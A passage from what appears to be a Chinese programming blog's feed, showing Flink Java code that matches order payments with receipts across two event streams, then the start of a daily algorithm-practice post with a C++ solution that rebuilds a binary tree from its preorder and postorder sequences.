class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderTimeoutSelect</span> <span class="keyword">implements</span> <span class="title">PatternTimeoutFunction</span>&lt;<span class="title">OrderEvent</span>,<span class="title">OrderResult</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> OrderResult <span class="title">timeout</span><span class="params">(Map&lt;String, List&lt;OrderEvent&gt;&gt; pattern, <span class="keyword">long</span> timeoutTimestamp)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Long begin = pattern.get(<span class="string">&quot;begin&quot;</span>).iterator().next().orderId;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderResult(begin,<span class="string">&quot;timeout&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderPaySelect</span> <span class="keyword">implements</span> <span class="title">PatternSelectFunction</span>&lt;<span class="title">OrderEvent</span>, <span class="title">OrderResult</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> OrderResult <span class="title">select</span><span class="params">(Map&lt;String, List&lt;OrderEvent&gt;&gt; pattern)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Long follow = pattern.get(<span class="string">&quot;follow&quot;</span>).iterator().next().orderId;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderResult(follow,<span class="string">&quot;payed successfully&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="方法二-直接使用状态编程"><a href="#方法二-直接使用状态编程" class="headerlink" title="方法二 直接使用状态编程"></a>方法二 直接使用状态编程</h4><p>遇到这种问题，直接理清思路就好，就先不写了。</p>
<h3 id="来自两条流的订单交易匹配"><a href="#来自两条流的订单交易匹配" class="headerlink" title="来自两条流的订单交易匹配"></a>来自两条流的订单交易匹配</h3><p>对于订单支付事件，用户支付完成其实并不算完，我们还得确认平台账户上是否到账了。而往往这会来自不同的日志信息，所以我们要同时读入两条流的数据来做合并处理。这里我们利用connect将两条流进行连接，然后用自定义的CoProcessFunction进行处理。</p>
<h4 id="方法一：connect-CoProcess"><a href="#方法一：connect-CoProcess" class="headerlink" title="方法一：connect + CoProcess"></a>方法一：connect + CoProcess</h4><p>这里使用了流之间的connect</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输入输出的样例类</span></span><br><span class="line"><span class="comment">//  case class ReceiptEvent(txId:String, payChannel:String, timestamp:Long)</span></span><br><span class="line"><span class="comment">//  case class OrderEvent(orderId:Long, eventType:String, txId:String, eventTime:Long)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReceiptEvent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String txId;</span><br><span class="line">    <span class="keyword">public</span> String payChannel;</span><br><span class="line">    <span class="keyword">public</span> Long timestamp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ReceiptEvent</span><span class="params">(String txId, String payChannel, Long timestamp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.txId = txId;</span><br><span class="line">        <span class="keyword">this</span>.payChannel = payChannel;</span><br><span class="line">        <span class="keyword">this</span>.timestamp = timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ReceiptEvent&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;txId=&#x27;&quot;</span> + txId + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, payChannel=&#x27;&quot;</span> + payChannel + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, timestamp=&quot;</span> + timestamp +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderEvent2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Long orderId;</span><br><span class="line">    <span class="keyword">public</span> String eventType;</span><br><span class="line">    <span class="keyword">public</span> String txId;</span><br><span class="line">    <span class="keyword">public</span> Long eventTime;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OrderEvent2</span><span class="params">(Long orderId, String eventType, String txId, Long eventTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.orderId = orderId;</span><br><span class="line">        <span class="keyword">this</span>.eventType = eventType;</span><br><span class="line">        <span class="keyword">this</span>.txId = txId;</span><br><span class="line">        <span class="keyword">this</span>.eventTime = eventTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OrderEvent2&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;orderId=&quot;</span> + orderId +</span><br><span class="line">                <span class="string">&quot;, eventType=&#x27;&quot;</span> + eventType + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, txId=&#x27;&quot;</span> + txId + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, eventTime=&quot;</span> + eventTime +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderPayTxMatch</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;data/OrderLog.csv&quot;</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;OrderEvent2&gt; orderEventStream = stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, OrderEvent2&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> OrderEvent2 <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent2(Long.parseLong(split[<span class="number">0</span>].trim()), split[<span class="number">1</span>].trim(), split[<span class="number">2</span>].trim(), Long.parseLong(split[<span class="number">3</span>].trim()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">                .assignTimestampsAndWatermarks(WatermarkStrategy.&lt;OrderEvent2&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                        .withTimestampAssigner((event, timestamr) -&gt; event.eventTime * <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        KeyedStream&lt;OrderEvent2, String&gt; keyedStream = orderEventStream.keyBy(value -&gt; value.txId);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource2 = env.readTextFile(<span class="string">&quot;data/ReceiptLog.csv&quot;</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;ReceiptEvent&gt; receiptEventStream = stringDataStreamSource2.map(<span class="keyword">new</span> MapFunction&lt;String, ReceiptEvent&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> ReceiptEvent <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> ReceiptEvent(split[<span class="number">0</span>].trim(), split[<span class="number">1</span>].trim(), Long.parseLong(split[<span class="number">2</span>].trim()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">                .assignTimestampsAndWatermarks(WatermarkStrategy.&lt;ReceiptEvent&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                        .withTimestampAssigner((event, timestamr) -&gt; event.timestamp * <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        KeyedStream&lt;ReceiptEvent, String&gt; keyedStream2 = receiptEventStream.keyBy(value -&gt; value.txId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义测输出流</span></span><br><span class="line">        <span class="comment">// OutputTag&lt;OrderEvent2&gt; outputTag = new OutputTag&lt;OrderEvent2&gt;(&quot;unmatchedPay&quot;) &#123;&#125;;</span></span><br><span class="line">        <span class="comment">// OutputTag&lt;ReceiptEvent&gt; outputTag2 = new OutputTag&lt;ReceiptEvent&gt;(&quot;unmatchedRec&quot;) &#123;&#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// connect 连接两条流，匹配事件进行处理</span></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple2&lt;OrderEvent2, ReceiptEvent&gt;&gt; process = keyedStream.connect(keyedStream2).process(<span class="keyword">new</span> OrderPayTxDetect());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印输出</span></span><br><span class="line">        process.print();</span><br><span class="line">        process.getSideOutput(<span class="keyword">new</span> OutputTag&lt;OrderEvent2&gt;(<span class="string">&quot;unmatchedPay&quot;</span>) &#123;&#125;).print();</span><br><span class="line">        process.getSideOutput(<span class="keyword">new</span> OutputTag&lt;ReceiptEvent&gt;(<span class="string">&quot;unmatchedRec&quot;</span>) &#123;&#125;).print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderPayTxDetect</span> <span class="keyword">extends</span> <span class="title">CoProcessFunction</span>&lt;<span class="title">OrderEvent2</span>, <span class="title">ReceiptEvent</span>, <span class="title">Tuple2</span>&lt;<span class="title">OrderEvent2</span>, <span class="title">ReceiptEvent</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ValueState&lt;OrderEvent2&gt; pay;</span><br><span class="line">    <span class="keyword">public</span> ValueState&lt;ReceiptEvent&gt; receipt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        pay = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;OrderEvent2&gt;(<span class="string">&quot;pay&quot;</span>, OrderEvent2.class));</span><br><span class="line">        receipt = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;ReceiptEvent&gt;(<span class="string">&quot;receipt&quot;</span>, ReceiptEvent.class));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement1</span><span class="params">(OrderEvent2 value, Context ctx, Collector&lt;Tuple2&lt;OrderEvent2, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// pay 来了，考察有没有对应的 receipt 来过</span></span><br><span class="line">        ReceiptEvent value1 = receipt.value();</span><br><span class="line">        <span class="keyword">if</span>(value1!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果已经有 receipt，正常输出到主流</span></span><br><span class="line">            out.collect(<span class="keyword">new</span> Tuple2&lt;&gt;(value,value1));</span><br><span class="line">            receipt.clear();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果 receipt 还没来，那么把 pay 存入状态，注册一个定时器等待 5 秒</span></span><br><span class="line">            pay.update(value);</span><br><span class="line">            ctx.timerService().registerProcessingTimeTimer(value.eventTime*<span class="number">1000L</span> + <span class="number">5000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement2</span><span class="params">(ReceiptEvent value, Context ctx, Collector&lt;Tuple2&lt;OrderEvent2, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//receipt来了，判断有没有对应的pay来过</span></span><br><span class="line">        OrderEvent2 value1 = pay.value();</span><br><span class="line">        <span class="keyword">if</span>(value1!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果已经有 pay，正常输出到主流</span></span><br><span class="line">            out.collect(<span class="keyword">new</span> Tuple2&lt;&gt;(value1,value));</span><br><span class="line">            pay.clear();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果 pay 还没来，那么把 receipt 存入状态，注册一个定时器等待 3 秒</span></span><br><span class="line">            receipt.update(value);</span><br><span class="line">            ctx.timerService().registerProcessingTimeTimer(value.timestamp*<span class="number">1000L</span> + <span class="number">3000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定时触发， 有两种情况，所以要判断当前有没有pay和receipt</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;Tuple2&lt;OrderEvent2, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//如果 pay 不为空，说明receipt没来，输出unmatchedPays</span></span><br><span class="line">        <span class="keyword">if</span> (pay.value() != <span class="keyword">null</span>)&#123;</span><br><span class="line">            ctx.output(<span class="keyword">new</span> OutputTag&lt;OrderEvent2&gt;(<span class="string">&quot;unmatchedPay&quot;</span>) &#123;&#125;,pay.value());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (receipt.value() != <span class="keyword">null</span>)&#123;</span><br><span class="line">            ctx.output(<span class="keyword">new</span> OutputTag&lt;ReceiptEvent&gt;(<span class="string">&quot;unmatchedRec&quot;</span>) &#123;&#125;,receipt.value());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 清除状态</span></span><br><span class="line">        pay.clear();</span><br><span class="line">        receipt.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="方法二：join"><a href="#方法二：join" class="headerlink" title="方法二：join"></a>方法二：join</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderPayTxMatchWithJoin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;data/OrderLog.csv&quot;</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;OrderEvent2&gt; orderEventStream = stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, OrderEvent2&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> OrderEvent2 <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent2(Long.parseLong(split[<span class="number">0</span>].trim()), split[<span class="number">1</span>].trim(), split[<span class="number">2</span>].trim(), Long.parseLong(split[<span class="number">3</span>].trim()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">                .assignTimestampsAndWatermarks(WatermarkStrategy.&lt;OrderEvent2&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                        .withTimestampAssigner((event, timestamr) -&gt; event.eventTime * <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        KeyedStream&lt;OrderEvent2, String&gt; keyedStream = orderEventStream.keyBy(value -&gt; value.txId);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource2 = env.readTextFile(<span class="string">&quot;data/ReceiptLog.csv&quot;</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;ReceiptEvent&gt; receiptEventStream = stringDataStreamSource2.map(<span class="keyword">new</span> MapFunction&lt;String, ReceiptEvent&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> ReceiptEvent <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> ReceiptEvent(split[<span class="number">0</span>].trim(), split[<span class="number">1</span>].trim(), Long.parseLong(split[<span class="number">2</span>].trim()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">                .assignTimestampsAndWatermarks(WatermarkStrategy.&lt;ReceiptEvent&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                        .withTimestampAssigner((event, timestamr) -&gt; event.timestamp * <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        KeyedStream&lt;ReceiptEvent, String&gt; keyedStream2 = receiptEventStream.keyBy(value -&gt; value.txId);</span><br><span class="line"></span><br><span class="line">        keyedStream.intervalJoin(keyedStream2)</span><br><span class="line">                .between(Time.seconds(-<span class="number">5</span>),Time.seconds(<span class="number">3</span>))</span><br><span class="line">                .process(<span class="keyword">new</span> OrderPayTxDetectWithJoin()).print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderPayTxDetectWithJoin</span> <span class="keyword">extends</span> <span class="title">ProcessJoinFunction</span>&lt;<span class="title">OrderEvent2</span>, <span class="title">ReceiptEvent</span>, <span class="title">Tuple2</span>&lt;<span class="title">OrderEvent2</span>, <span class="title">ReceiptEvent</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(OrderEvent2 left, ReceiptEvent right, Context ctx, Collector&lt;Tuple2&lt;OrderEvent2, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        out.collect(<span class="keyword">new</span> Tuple2&lt;&gt;(left,right));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>Flink</tag>
      </tags>
  </entry>
  <entry>
    <title>算法唯手熟尔(PAT剩余清单 or leetcode)</title>
    <url>/2020/03/05/%E7%AE%97%E6%B3%95every-day/</url>
    <content><![CDATA[<p>算法笔记的前十章一眨眼就过去了，每天保证至少一题，题源随意，题目思路都会写在代码思路中</p>
<p>水平太菜，所谓的的C，全部使用了STL</p>
<span id="more"></span>

<h3 id="2020-3-5"><a href="#2020-3-5" class="headerlink" title="2020/3/5"></a>2020/3/5</h3><h4 id="PAT-A1119-C"><a href="#PAT-A1119-C" class="headerlink" title="PAT A1119_C"></a>PAT A1119_C</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1119</span></span><br><span class="line"><span class="comment">//二叉树，已知前序和后序，写出一个中序的可能即可</span></span><br><span class="line"><span class="comment">//前序的开始的第一个应该是后序的最后一个是相等的，这个结点就是根结点</span></span><br><span class="line"><span class="comment">//不确定的状态可以都先当作右孩子</span></span><br><span class="line"><span class="comment">//如果只有一个儿子结点的话，在递归判断的时候无法知道是否是左儿子还是右儿子；</span></span><br><span class="line"><span class="comment">//但是如果有两个或者没有的话，是可以判断的</span></span><br><span class="line"><span class="comment">//如果根节点存在右子树，则post序列中倒数第二个节点(即根节点的右子树的根节点)</span></span><br><span class="line"><span class="comment">//在pre中的index与根节点的index差值一定大于1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; pre,post;</span><br><span class="line"><span class="keyword">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line"><span class="function">NODE *<span class="title">create</span><span class="params">(<span class="keyword">int</span> preL,<span class="keyword">int</span> preR,<span class="keyword">int</span> postL,<span class="keyword">int</span> postR)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preL&gt;preR) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    NODE *node =<span class="keyword">new</span> NODE;</span><br><span class="line">    node-&gt;left=<span class="literal">NULL</span>;</span><br><span class="line">    node-&gt;right=<span class="literal">NULL</span>;</span><br><span class="line">    node-&gt;data=pre[preL];</span><br><span class="line">    <span class="keyword">if</span>(preL==preR) <span class="keyword">return</span> node;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">for</span>(k=preL+<span class="number">1</span>;k&lt;=preR;k++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pre[k]==post[postR<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> leftnum=k-preL<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(k-preL&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        node-&gt;left=<span class="built_in">create</span>(preL+<span class="number">1</span>,preL+leftnum,postL,postL+leftnum<span class="number">-1</span>);</span><br><span class="line">        node-&gt;right=<span class="built_in">create</span>(preL+leftnum+<span class="number">1</span>,preR,postL+leftnum,postR<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        flag=<span class="literal">false</span>;</span><br><span class="line">        node-&gt;right = <span class="built_in">create</span>(preL+<span class="number">1</span>,preR,postL,postR<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(NODE *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">inOrder</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,root-&gt;data);</span><br><span class="line">    num++;</span><br><span class="line">    <span class="built_in">inOrder</span>(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    pre.<span class="built_in">resize</span>(n);</span><br><span class="line">    post.<span class="built_in">resize</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pre[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;post[i]);</span><br><span class="line">    NODE *root=<span class="built_in">create</span>(<span class="number">0</span>,n<span class="number">-1</span>,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="literal">true</span>)<span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(flag==<span class="literal">false</span>)<span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">	<span class="built_in">inOrder</span>(root);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); <span class="comment">//一定要加，不加全错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-3-6"><a href="#2020-3-6" class="headerlink" title="2020/3/6"></a>2020/3/6</h3><h4 id="PAT-A1123-C"><a href="#PAT-A1123-C" class="headerlink" title="PAT A1123_C"></a>PAT A1123_C</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 